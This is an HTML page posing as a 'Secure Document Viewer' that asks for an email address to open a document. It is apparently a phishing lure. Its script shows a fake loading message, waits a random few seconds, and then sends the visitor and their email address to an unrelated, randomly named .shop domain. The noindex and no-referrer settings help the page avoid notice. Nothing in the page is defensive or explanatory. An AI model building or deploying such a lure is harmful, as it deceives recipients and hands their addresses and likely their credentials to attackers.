<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Document Viewer</title>
  <meta name="robots" content="noindex">
  <meta name="referrer" content="no-referrer">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 80px;
      background-color: #f9f9f9;
    }
    h2 {
      color: #333;
    }
    p {
      color: #666;
      font-size: 16px;
    }
    input[type="email"] {
      padding: 10px;
      width: 250px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 10px 20px;
      margin-top: 10px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    #loading {
      display: none;
      margin-top: 20px;
      color: #333;
    }
  </style>
</head>
<body>
  <h2>Secure Document Viewer</h2>
  <p>Please enter your email address to access the document:</p>
  <form id="emailForm">
    <input type="email" id="email" name="email" placeholder="you@example.com" required>
    <br>
    <button type="submit">Open Document</button>
  </form>
  <div id="loading">Preparing your document, please wait...</div>

  <script>
    document.getElementById('emailForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = encodeURIComponent(document.getElementById('email').value);

      document.getElementById('emailForm').style.display = 'none';
      document.getElementById('loading').style.display = 'block';

      const delay = Math.floor(Math.random() * 2000) + 4000; // 4-6s delay

      setTimeout(function() {
        // Redirect to .shop domain with email in query
        window.location.href = "https://awm8p1ipn4.laterefloe.shop/?email=" + email;
      }, delay);
    });
  </script>
</body>
</html>
